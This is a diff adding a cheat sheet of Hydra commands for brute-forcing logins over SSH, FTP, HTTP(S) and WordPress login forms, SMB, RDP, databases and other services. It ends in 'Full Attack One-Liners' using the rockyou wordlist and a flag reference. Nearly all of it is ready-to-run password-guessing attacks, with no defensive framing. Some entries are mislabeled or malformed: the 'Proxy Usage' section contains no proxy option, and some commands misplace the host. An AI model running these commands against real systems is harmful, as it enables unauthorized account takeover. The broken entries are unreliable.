@@ -1,0 +1,131 @@
+# Hydra (Network Login Brute Forcer)
+
+## Basic Usage
+hydra -l admin -p password ssh://192.168.1.1
+hydra -l admin -P wordlist.txt ssh://192.168.1.1
+hydra -L users.txt -P wordlist.txt ssh://192.168.1.1
+hydra -L users.txt -p password ssh://192.168.1.1
+hydra -C credentials.txt ssh://192.168.1.1
+
+## SSH Brute Force
+hydra -l root -P wordlist.txt ssh://192.168.1.1
+hydra -l admin -P wordlist.txt ssh://192.168.1.1 -t 4
+hydra -L users.txt -P wordlist.txt ssh://192.168.1.1 -t 4 -v
+hydra -l root -P wordlist.txt -s 2222 ssh://192.168.1.1
+hydra -l admin -P wordlist.txt ssh://192.168.1.1 -o results.txt
+
+## FTP Brute Force
+hydra -l admin -P wordlist.txt ftp://192.168.1.1
+hydra -L users.txt -P wordlist.txt ftp://192.168.1.1
+hydra -l anonymous -p anonymous ftp://192.168.1.1
+hydra -l admin -P wordlist.txt ftp://192.168.1.1 -t 10 -v
+
+## HTTP GET Form Brute Force
+hydra -l admin -P wordlist.txt http-get://example.com
+hydra -l admin -P wordlist.txt http-get://example.com/admin
+hydra -l admin -P wordlist.txt example.com http-get /protected/area
+
+## HTTP POST Form Brute Force
+hydra -l admin -P wordlist.txt http-post-form://example.com/login.php
+hydra -l admin -P wordlist.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
+hydra -l admin -P wordlist.txt example.com http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+hydra -L users.txt -P wordlist.txt example.com http-post-form "/login:user=^USER^&pass=^PASS^:Login failed"
+hydra -l admin -P wordlist.txt example.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=Dashboard"
+
+## HTTPS POST Form Brute Force
+hydra -l admin -P wordlist.txt https-post-form://example.com/login
+hydra -l admin -P wordlist.txt example.com https-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
+hydra -l admin -P wordlist.txt -s 443 https-post-form "example.com/login:user=^USER^&pass=^PASS^:F=error"
+
+## HTTP Basic Authentication
+hydra -l admin -P wordlist.txt http-get://example.com/admin
+hydra -L users.txt -P wordlist.txt http-get://192.168.1.1/manager/html
+hydra -l tomcat -P wordlist.txt http-get://192.168.1.1/manager/html
+
+## SMB Brute Force
+hydra -l administrator -P wordlist.txt smb://192.168.1.1
+hydra -L users.txt -P wordlist.txt smb://192.168.1.1
+hydra -l admin -P wordlist.txt smb://192.168.1.0/24
+
+## RDP Brute Force
+hydra -l administrator -P wordlist.txt rdp://192.168.1.1
+hydra -L users.txt -P wordlist.txt rdp://192.168.1.1 -t 4
+
+## FTP / Telnet / Other Protocols
+hydra -l admin -P wordlist.txt telnet://192.168.1.1
+hydra -l admin -P wordlist.txt vnc://192.168.1.1
+hydra -l admin -P wordlist.txt imap://192.168.1.1
+hydra -l admin -P wordlist.txt pop3://192.168.1.1
+hydra -l admin -P wordlist.txt smtp://192.168.1.1
+hydra -l admin -P wordlist.txt ldap://192.168.1.1
+hydra -l admin -P wordlist.txt mssql://192.168.1.1
+hydra -l root -P wordlist.txt mysql://192.168.1.1
+hydra -l postgres -P wordlist.txt postgres://192.168.1.1
+hydra -l admin -P wordlist.txt redis://192.168.1.1
+hydra -l admin -P wordlist.txt snmp://192.168.1.1
+hydra -l admin -P wordlist.txt sip://192.168.1.1
+
+## Custom Port Scanning
+hydra -l admin -P wordlist.txt -s 8080 http-get://example.com
+hydra -l admin -P wordlist.txt -s 2222 ssh://192.168.1.1
+hydra -l admin -P wordlist.txt -s 8443 https-post-form "example.com/login:user=^USER^&pass=^PASS^:F=fail"
+
+## Proxy Usage
+hydra -l admin -P wordlist.txt -o results.txt ssh://192.168.1.1
+
+## Performance Tuning
+hydra -l admin -P wordlist.txt ssh://192.168.1.1 -t 4
+hydra -l admin -P wordlist.txt ssh://192.168.1.1 -t 16
+hydra -L users.txt -P wordlist.txt ssh://192.168.1.1 -t 4 -w 30
+hydra -l admin -P wordlist.txt http-post-form "example.com/login:user=^USER^&pass=^PASS^:fail" -t 20 -W 5
+
+## Output and Resume
+hydra -l admin -P wordlist.txt ssh://192.168.1.1 -o results.txt
+hydra -l admin -P wordlist.txt ssh://192.168.1.1 -o results.txt -b json
+hydra -l admin -P wordlist.txt ssh://192.168.1.1 -R
+hydra -l admin -P wordlist.txt ssh://192.168.1.1 -I
+
+## Verbose and Debug
+hydra -l admin -P wordlist.txt ssh://192.168.1.1 -v
+hydra -l admin -P wordlist.txt ssh://192.168.1.1 -V
+hydra -l admin -P wordlist.txt ssh://192.168.1.1 -d
+
+## Full Attack One-Liners
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1 -t 4 -o ssh_results.txt
+hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect" -t 20 -v
+hydra -l root -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.1 -t 10 -o ftp_brute.txt
+hydra -l administrator -P wordlist.txt rdp://192.168.1.1 -t 4 -V -o rdp_results.txt
+hydra -L users.txt -P wordlist.txt smb://192.168.1.1 -t 4 -v -o smb_results.txt
+hydra -l admin -P wordlist.txt mysql://192.168.1.1 -t 8 -v -o mysql_results.txt
+hydra -C creds.txt example.com https-post-form "/login:user=^USER^&pass=^PASS^:S=Welcome" -t 15 -o results.txt
+
+## Common Flags
+- `-l` - Single username to use for authentication attempts
+- `-L` - File containing a list of usernames to iterate through
+- `-p` - Single password to use for authentication attempts
+- `-P` - File containing a list of passwords to iterate through
+- `-C` - Colon-separated credentials file in `user:password` format; replaces `-l`/`-p`
+- `-s` - Custom target port when the service runs on a non-default port
+- `-t` - Number of parallel task threads per target (default: 16; use 4 for SSH/RDP)
+- `-w` - Wait time in seconds for a response before timing out (default: 32)
+- `-W` - Time to wait between connection attempts per thread in seconds
+- `-o` - Write all found credentials to the specified output file
+- `-b` - Output file format when used with `-o` (text or json)
+- `-R` - Restore a previously interrupted session from the hydra.restore file
+- `-I` - Ignore an existing restore file and start a fresh session
+- `-v` - Verbose mode; show login attempts and responses
+- `-V` - Very verbose mode; show every single username and password attempt
+- `-d` - Debug mode; display full connection and protocol details
+- `-e` - Additional password checks: n=null password, s=login as password, r=reversed login
+- `-f` - Exit after the first valid credential pair is found per host
+- `-F` - Exit after the first valid credential pair is found across all hosts
+- `-M` - File containing a list of target hosts to attack simultaneously
+- `-u` - Loop around users instead of passwords; useful when account lockout is a concern
+- `-x` - Generate passwords on the fly using a specified charset and length range
+- `http-post-form` - Module for POST-based login forms; format: `"path:POST_data:F=fail_string"` or `"path:POST_data:S=success_string"`
+- `https-post-form` - Same as http-post-form but over SSL/TLS
+- `http-get` - Module for HTTP Basic Authentication or GET-based login pages
+- `^USER^` - Placeholder in POST data replaced with the current username attempt
+- `^PASS^` - Placeholder in POST data replaced with the current password attempt
+- `F=` - Failure condition string; marks a response as a failed login attempt
+- `S=` - Success condition string; marks a response as a successful login attempt
